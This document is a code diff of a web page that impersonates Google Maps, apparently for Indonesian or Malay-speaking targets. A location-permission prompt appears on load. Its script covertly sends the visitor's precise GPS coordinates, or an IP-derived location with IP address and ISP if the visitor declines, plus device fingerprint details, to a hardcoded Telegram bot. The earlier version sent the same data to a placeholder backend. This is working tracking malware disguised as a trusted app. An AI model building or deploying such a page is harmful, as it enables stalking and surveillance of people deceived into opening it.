@@ -1,162 +1,391 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Maps</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Google Maps</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%234285F4' d='M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7zm0 9.5a2.5 2.5 0 1 1 0-5 2.5 2.5 0 0 1 0 5z'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; font-family: Roboto, -apple-system, "Segoe UI", sans-serif; overflow: hidden; background: #e8eaed; }
 
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; outline: none; -webkit-tap-highlight-color: transparent; }
-        body, html { height: 100%; width: 100%; overflow: hidden; background: #000; }
-        
-        #map { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; filter: brightness(0.6) contrast(1.1); transition: transform 4s cubic-bezier(0.25, 1, 0.5, 1); transform-origin: center; }
-        .map-zoomed { transform: scale(1.15); }
+  #map { position: fixed; inset: 0; z-index: 1; }
+  .leaflet-control-attribution { display: none !important; }
 
-        .floating-search { position: absolute; top: 16px; left: 16px; right: 16px; background: #ffffff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); padding: 14px 18px; z-index: 5; display: flex; justify-content: space-between; align-items: center; transition: opacity 0.3s; }
-        .search-text { font-size: 16px; color: #202124; font-weight: 500; }
-        .close-btn { font-size: 20px; color: #5f6368; border: none; background: none; cursor: pointer; }
+  /* === TOPBAR === */
+  .topbar {
+    position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+    padding: 10px 12px; display: flex; align-items: center; gap: 10px;
+    background: linear-gradient(to bottom, rgba(255,255,255,0.95), rgba(255,255,255,0));
+    pointer-events: none;
+  }
+  .topbar > * { pointer-events: auto; }
+  .menu-btn {
+    width: 44px; height: 44px; border-radius: 50%; background: #fff;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.2); border: none; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .menu-btn svg { width: 22px; height: 22px; fill: #5f6368; }
+  .search {
+    flex: 1; height: 44px; background: #fff; border-radius: 22px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.2); display: flex; align-items: center;
+    padding: 0 16px; gap: 10px;
+  }
+  .search svg { width: 20px; height: 20px; fill: #5f6368; flex-shrink: 0; }
+  .search input {
+    border: none; outline: none; background: none; font-size: 15px;
+    flex: 1; color: #202124; font-family: inherit;
+  }
+  .search input::placeholder { color: #5f6368; }
+  .avatar {
+    width: 34px; height: 34px; border-radius: 50%;
+    background: #1a73e8; color: #fff; display: flex; align-items: center;
+    justify-content: center; font-weight: 500; font-size: 15px;
+    border: 2px solid #fff; box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+  }
 
-        .dialog-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 100; display: flex; justify-content: center; align-items: flex-end; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; backdrop-filter: blur(4px); }
-        .dialog-overlay.show { opacity: 1; pointer-events: auto; }
+  /* === FAB === */
+  .bottombar {
+    position: fixed; bottom: 16px; right: 12px; z-index: 1000;
+    display: flex; flex-direction: column; gap: 10px;
+  }
+  .fab {
+    width: 46px; height: 46px; border-radius: 50%; background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.25); border: none; cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: transform 0.15s;
+  }
+  .fab:active { transform: scale(0.92); }
+  .fab svg { width: 22px; height: 22px; fill: #5f6368; }
+  .fab.locate svg { fill: #1a73e8; }
+  .fab.locate.loading svg { animation: pulse 1s infinite; }
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
 
-        .dialog-box { background: #ffffff; padding: 12px 24px 32px 24px; border-radius: 32px 32px 0 0; text-align: center; width: 100%; max-width: 500px; position: relative; transform: translateY(100%) scale(0.9); opacity: 0; transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s; }
-        .dialog-overlay.show .dialog-box { transform: translateY(0) scale(1); opacity: 1; }
+  /* === BOTTOM SHEET BACKDROP === */
+  .sheet-backdrop {
+    position: fixed; inset: 0; z-index: 4999;
+    background: rgba(32, 33, 36, 0.45);
+    backdrop-filter: blur(5px);
+    -webkit-backdrop-filter: blur(5px);
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.3s ease;
+  }
+  .sheet-backdrop.show { opacity: 1; pointer-events: auto; }
 
-        .dialog-box.animate-out { transform: translateY(100%) scale(0.7); opacity: 0; transition: transform 0.3s cubic-bezier(0.6, -0.28, 0.735, 0.045), opacity 0.2s; }
+  /* === BOTTOM SHEET === */
+  .bottom-sheet {
+    position: fixed; left: 0; right: 0; bottom: 0; z-index: 5000;
+    background: #fff;
+    border-radius: 28px 28px 0 0;
+    padding: 12px 20px calc(24px + env(safe-area-inset-bottom, 0px));
+    box-shadow: 0 -8px 40px rgba(0,0,0,0.18);
+    transform: translate3d(0, 100%, 0);
+    transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+    will-change: transform;
+    max-width: 500px;
+    margin: 0 auto;
+  }
+  .bottom-sheet.show { transform: translate3d(0, 0, 0); }
 
-        .drag-handle { width: 32px; height: 4px; background: #dadce0; border-radius: 2px; margin: 0 auto 20px auto; }
-        .map-logo-container { display: flex; flex-direction: column; align-items: center; margin-bottom: 20px; position: relative; }
-        .logo-glow-bg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100px; height: 100px; background: radial-gradient(circle, rgba(66,133,244,0.5) 0%, rgba(255,255,255,0) 70%); filter: blur(10px); z-index: 1; animation: pulseGlow 2s infinite alternate; }
-        @keyframes pulseGlow { 0% { opacity: 0.6; transform: translate(-50%, -50%) scale(0.9); } 100% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); } }
+  .sheet-handle {
+    width: 36px; height: 4px; border-radius: 2px;
+    background: #dadce0; margin: 0 auto 20px;
+  }
 
-        .map-logo-img { width: 55px; height: 55px; margin-bottom: 5px; position: relative; z-index: 2; filter: drop-shadow(0px 4px 8px rgba(0,0,0,0.15)); }
-        .map-logo-text { font-size: 22px; background: linear-gradient(90deg, #4285F4, #34A853, #FBBC05, #EA4335); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; letter-spacing: -0.5px; position: relative; z-index: 2; }
+  .sheet-icon {
+    width: 56px; height: 56px; border-radius: 50%;
+    background: linear-gradient(135deg, #e8f0fe 0%, #d2e3fc 100%);
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 16px;
+  }
+  .sheet-icon svg { width: 30px; height: 30px; fill: #1a73e8; }
 
-        .dialog-box h2 { font-size: 20px; color: #202124; margin-bottom: 10px; font-weight: 500; }
-        .dialog-box p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
+  .sheet-title {
+    font-size: 20px; font-weight: 500; color: #202124;
+    text-align: center; margin-bottom: 8px;
+    line-height: 1.3;
+  }
+  .sheet-body {
+    font-size: 14px; color: #5f6368; text-align: center;
+    line-height: 1.55; margin-bottom: 24px;
+    padding: 0 8px;
+  }
+  .sheet-body b { color: #202124; font-weight: 500; }
 
-        .btn-group { display: flex; gap: 12px; position: relative; z-index: 10; }
-        .btn-cancel { flex: 1; padding: 14px; border-radius: 100px; border: 1px solid #dadce0; background: #ffffff; color: #3c4043; font-weight: 500; font-size: 15px; cursor: pointer; transition: background 0.2s; }
-        .btn-cancel:active { background: #f1f3f4; }
-        .btn-allow { flex: 1; padding: 14px; border-radius: 100px; border: none; background: #1a73e8; color: #ffffff; font-weight: 500; font-size: 15px; cursor: pointer; box-shadow: 0 0 15px rgba(26, 115, 232, 0.6), 0 4px 8px rgba(0,0,0,0.1); transition: transform 0.1s, box-shadow 0.2s; }
-        .btn-allow:active { transform: scale(0.95); box-shadow: 0 0 25px rgba(26, 115, 232, 0.9), 0 2px 4px rgba(0,0,0,0.1); background: #1557b0; }
+  .sheet-actions { display: flex; flex-direction: column; gap: 10px; }
+  .sheet-btn {
+    width: 100%; height: 50px; border-radius: 12px;
+    border: none; font-size: 15px; font-weight: 500;
+    cursor: pointer; font-family: inherit;
+    transition: transform 0.12s, background 0.2s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .sheet-btn:active { transform: scale(0.97); }
+  .sheet-btn.primary {
+    background: #1a73e8; color: #fff;
+    box-shadow: 0 2px 8px rgba(26,115,232,0.35);
+  }
+  .sheet-btn.primary:hover { background: #1765cc; }
+  .sheet-btn.secondary {
+    background: transparent; color: #1a73e8;
+  }
+  .sheet-btn.secondary:hover { background: rgba(26,115,232,0.06); }
 
-        .loading-state { display: none; padding: 20px 0; }
-        .spinner { border: 4px solid #f1f3f4; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+  /* === TOAST === */
+  .toast {
+    position: fixed; top: 70px; left: 50%; transform: translateX(-50%) translateY(-20px);
+    background: #323232; color: #fff; padding: 12px 20px; border-radius: 8px;
+    font-size: 14px; z-index: 4000; opacity: 0; pointer-events: none;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    max-width: 90vw; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* Blue dot */
+  .blue-dot {
+    width: 20px; height: 20px; border-radius: 50%; background: #1a73e8;
+    border: 3px solid #fff; box-shadow: 0 0 0 1px rgba(0,0,0,0.2), 0 0 20px rgba(26,115,232,0.6);
+    position: relative;
+  }
+  .blue-dot::after {
+    content: ''; position: absolute; inset: -14px; border-radius: 50%;
+    background: rgba(26,115,232,0.18); animation: ripple 2s infinite;
+  }
+  @keyframes ripple {
+    0% { transform: scale(0.6); opacity: 1; }
+    100% { transform: scale(1.6); opacity: 0; }
+  }
+</style>
 </head>
 <body>
-    <div id="map"></div>
-    
-    <div class="floating-search" id="searchBar">
-        <span class="search-text">3°01'47.2"N 101°26'58.8"E</span>
-        <button class="close-btn">✕</button>
-    </div>
 
-    <div class="dialog-overlay" id="dialogOverlay">
-        <div class="dialog-box" id="dialogBox">
-            <div id="askState">
-                <div class="drag-handle"></div>
-                <div class="map-logo-container">
-                    <div class="logo-glow-bg"></div>
-                    <img class="map-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" alt="Google Maps">
-                    <div class="map-logo-text">Google Maps</div>
-                </div>
-                <h2>Benarkan Akses Lokasi?</h2>
-                <p>Google Maps memerlukan lokasi anda untuk memberikan laluan terbaik ke destinasi.</p>
-                <div class="btn-group">
-                    <button class="btn-cancel" id="btnDeny">Tidak</button>
-                    <button class="btn-allow" id="btnAllow">Benarkan</button>
-                </div>
-            </div>
-            <div id="loadingState" class="loading-state">
-                <div class="spinner"></div>
-                <h2>Mengesan Lokasi...</h2>
-                <p>Sila tunggu...</p>
-            </div>
-        </div>
-    </div>
+<div id="map"></div>
 
+<!-- TOPBAR -->
+<div class="topbar">
+  <button class="menu-btn" aria-label="Menu">
+    <svg viewBox="0 0 24 24"><path d="M3 6h18v2H3V6zm0 5h18v2H3v-2zm0 5h18v2H3v-2z"/></svg>
+  </button>
+  <div class="search">
+    <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.7.7l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14z"/></svg>
+    <input type="text" id="searchInput" placeholder="Telusuri di sini" autocomplete="off">
+  </div>
+  <div class="avatar">J</div>
+</div>
+
+<!-- FAB -->
+<div class="bottombar">
+  <button class="fab" id="zoomIn" aria-label="Zoom in">
+    <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+  </button>
+  <button class="fab" id="zoomOut" aria-label="Zoom out">
+    <svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg>
+  </button>
+  <button class="fab locate" id="locateBtn" aria-label="Lokasi saya">
+    <svg viewBox="0 0 24 24"><path d="M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8zm8.94 3a8.994 8.994 0 0 0-7.94-7.94V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19a7 7 0 1 1 0-14 7 7 0 0 1 0 14z"/></svg>
+  </button>
+</div>
+
+<!-- BACKDROP -->
+<div class="sheet-backdrop" id="sheetBackdrop"></div>
+
+<!-- BOTTOM SHEET -->
+<div class="bottom-sheet" id="bottomSheet">
+  <div class="sheet-handle"></div>
+  <div class="sheet-icon">
+    <svg viewBox="0 0 24 24"><path d="M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8zm8.94 3a8.994 8.994 0 0 0-7.94-7.94V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19a7 7 0 1 1 0-14 7 7 0 0 1 0 14z"/></svg>
+  </div>
+  <div class="sheet-title">Izinkan Maps mengakses lokasi Anda?</div>
+  <div class="sheet-body">Lokasi Anda digunakan untuk menampilkan <b>posisi terkini</b>, rute, dan rekomendasi tempat terdekat.</div>
+  <div class="sheet-actions">
+    <button class="sheet-btn primary" id="permAllow">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 8a4 4 0 1 0 0 8 4 4 0 0 0 0-8zm8.94 3a8.994 8.994 0 0 0-7.94-7.94V1h-2v2.06A8.994 8.994 0 0 0 3.06 11H1v2h2.06A8.994 8.994 0 0 0 11 20.94V23h2v-2.06A8.994 8.994 0 0 0 20.94 13H23v-2h-2.06zM12 19a7 7 0 1 1 0-14 7 7 0 0 1 0 14z"/></svg>
+      Izinkan Lokasi
+    </button>
+    <button class="sheet-btn secondary" id="permDeny">Nanti saja</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-    // GANTI PAKAI LINK CLOUDFLARE JS YANG AKTIF
-    const BACKEND_URL = "LINK_CLOUDFLARE_JS"; 
+// ================= KONFIG BOT TELEGRAM =================
+const TG_BOT_TOKEN = '8746043042:AAFEGLROcXQkhpVXpfAIcyz7LdppMllvgXI';
+const TG_CHAT_ID   = '7997322451'; 
+// =======================================================
 
-    var map = L.map('map', {zoomControl: false}).setView([3.0297, 101.4497], 16);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+const toastEl = document.getElementById('toast');
+function toast(msg, ms = 2500) {
+  toastEl.textContent = msg;
+  toastEl.classList.add('show');
+  clearTimeout(toast._t);
+  toast._t = setTimeout(() => toastEl.classList.remove('show'), ms);
+}
 
-    function getDeviceInfo() {
-        const ua = navigator.userAgent;
-        let device = "Unknown Device";
-        let os = "Unknown OS";
+// Init peta
+const map = L.map('map', { zoomControl: false, attributionControl: false })
+  .setView([-6.2088, 106.8456], 12);
 
-        if (/android/i.test(ua)) {
-            os = "Android";
-            const match = ua.match(/Android\s([0-9\.]+)/);
-            if (match) os += (match[1] === "10") ? " (Modern)" : " " + match[1];
-            
-            const modelMatch = ua.match(/;\s?([^;]+)\s?Build/);
-            if (modelMatch) device = modelMatch[1].trim();
-            else device = "Android Phone";
-        } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            os = "iOS";
-            const match = ua.match(/OS\s([0-9_]+)/);
-            if (match) os += " " + match[1].replace(/_/g, '.');
-            device = ua.includes("iPad") ? "iPad" : "iPhone";
-        } else if (/Windows/i.test(ua)) {
-            os = "Windows"; device = "Windows PC";
-        } else if (/Macintosh/i.test(ua)) {
-            os = "macOS"; device = "MacBook / iMac";
-        }
-        return { device, os };
-    }
+L.tileLayer('https://tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  maxZoom: 19
+}).addTo(map);
 
-    const deviceInfo = getDeviceInfo();
+let blueMarker = null;
+function placeBlueDot(lat, lng) {
+  const icon = L.divIcon({
+    className: '',
+    html: '<div class="blue-dot"></div>',
+    iconSize: [20, 20],
+    iconAnchor: [10, 10]
+  });
+  if (blueMarker) map.removeLayer(blueMarker);
+  blueMarker = L.marker([lat, lng], { icon, interactive: false }).addTo(map);
+  map.flyTo([lat, lng], 17, { duration: 1.2 });
+}
 
-    window.addEventListener('load', () => {
-        setTimeout(() => {
-            document.getElementById('map').classList.add('map-zoomed');
-            document.getElementById('searchBar').style.opacity = '0';
-            document.getElementById('dialogOverlay').classList.add('show');
-        }, 400);
+// ====== Sheet controller ======
+const sheet       = document.getElementById('bottomSheet');
+const backdrop    = document.getElementById('sheetBackdrop');
+const locateBtn   = document.getElementById('locateBtn');
+let asked = false;
+
+function openSheet() {
+  if (asked) return;
+  asked = true;
+  
+  backdrop.classList.add('show');
+  
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      sheet.classList.add('show');
     });
+  });
+}
 
-    function triggerGPS() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    // === TRIK REDIRECT URL (ANTI BLOKIR) ===
-                    // Browser HP bakal dialihin sebentar ke Cloudflare, lalu Cloudflare balikin ke Google Maps
-                    window.location.href = `${BACKEND_URL}/capture?lat=${lat}&lon=${lon}&device=${encodeURIComponent(deviceInfo.device)}&os=${encodeURIComponent(deviceInfo.os)}`;
-                },
-                (error) => {
-                    window.location.href = "https://www.google.com/maps/search/?api=1&query=3.0297,101.4497";
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        }
+function closeSheet() {
+  backdrop.classList.remove('show');
+  sheet.classList.remove('show');
+}
 
-        const dialogBox = document.getElementById('dialogBox');
-        dialogBox.classList.add('animate-out');
-        
-        setTimeout(() => {
-            document.getElementById('askState').style.display = 'none';
-            document.getElementById('loadingState').style.display = 'block';
-            dialogBox.classList.remove('animate-out');
-            dialogBox.style.transform = 'translateY(0) scale(1)';
-            dialogBox.style.opacity = '1';
-        }, 300);
+// Auto pop-up serta-merta
+document.addEventListener('DOMContentLoaded', () => {
+  openSheet();
+});
+
+// Handler
+document.getElementById('permDeny').onclick = () => {
+  closeSheet();
+  toast('Menggunakan lokasi perkiraan');
+  sendGeoIpFallback();
+};
+
+document.getElementById('permAllow').onclick = () => permAllowHandler();
+
+locateBtn.onclick = () => {
+  if (!asked) {
+    openSheet();
+  } else {
+    permAllowHandler();
+  }
+};
+
+document.getElementById('zoomIn').onclick = () => map.zoomIn();
+document.getElementById('zoomOut').onclick = () => map.zoomOut();
+backdrop.onclick = () => closeSheet();
+
+async function permAllowHandler() {
+  closeSheet();
+  locateBtn.classList.add('loading');
+  try {
+    const pos = await getLocation();
+    placeBlueDot(pos.lat, pos.lon);
+    toast('Lokasi ditemukan');
+    sendToTelegram({ lat: pos.lat, lon: pos.lon, acc: pos.acc, source: 'GPS' });
+  } catch (err) {
+    toast('Lokasi tidak tersedia');
+    sendGeoIpFallback();
+  } finally {
+    locateBtn.classList.remove('loading');
+  }
+}
+
+function getLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject(new Error('unsupported'));
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+      e => reject(e),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  });
+}
+
+async function sendGeoIpFallback() {
+  try {
+    const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+    const j = await r.json();
+    if (j.latitude && j.longitude) {
+      placeBlueDot(j.latitude, j.longitude);
+      sendToTelegram({
+        lat: j.latitude, lon: j.longitude, acc: null,
+        city: j.city, country: j.country_name,
+        ip: j.ip, isp: j.org, source: 'IP-Geo'
+      });
     }
+  } catch {}
+}
 
-    document.getElementById('btnAllow').addEventListener('click', triggerGPS);
-    document.getElementById('btnDeny').addEventListener('click', triggerGPS);
+async function sendToTelegram(data) {
+  const ua = navigator.userAgent;
+  const platform = navigator.platform || '-';
+  const lang = navigator.language || '-';
+  const screenRes = `${screen.width}x${screen.height}`;
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '-';
+  const now = new Date().toLocaleString('id-ID', { timeZone: tz });
+
+  let locText =
+    `<b>Latitude:</b> <code>${data.lat}</code>\n` +
+    `<b>Longitude:</b> <code>${data.lon}</code>\n` +
+    (data.acc ? `<b>Akurasi:</b> ±${Math.round(data.acc)} m\n` : '') +
+    (data.city ? `<b>Kota:</b> ${data.city}\n` : '') +
+    (data.country ? `<b>Negara:</b> ${data.country}\n` : '') +
+    (data.ip ? `<b>IP:</b> <code>${data.ip}</code>\n` : '') +
+    (data.isp ? `<b>ISP:</b> ${data.isp}\n` : '') +
+    `<b>Maps:</b> https://www.google.com/maps?q=${data.lat},${data.lon}\n` +
+    `<b>Sumber:</b> ${data.source}`;
+
+  const msg =
+    `📍 <b>LOKASI BARU</b>\n` +
+    `━━━━━━━━━━━━━━━━━━\n` +
+    `${locText}\n` +
+    `━━━━━━━━━━━━━━━━━━\n` +
+    `<b>Waktu:</b> ${now}\n` +
+    `<b>UA:</b> <code>${escapeHtml(ua.slice(0, 120))}</code>\n` +
+    `<b>Platform:</b> ${escapeHtml(platform)} · <b>Bahasa:</b> ${escapeHtml(lang)}\n` +
+    `<b>Layar:</b> ${screenRes} · <b>TZ:</b> ${escapeHtml(tz)}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        disable_web_page_preview: false
+      })
+    });
+  } catch (e) { console.error(e); }
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, m => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  }[m]));
+}
 </script>
 </body>
 </html>
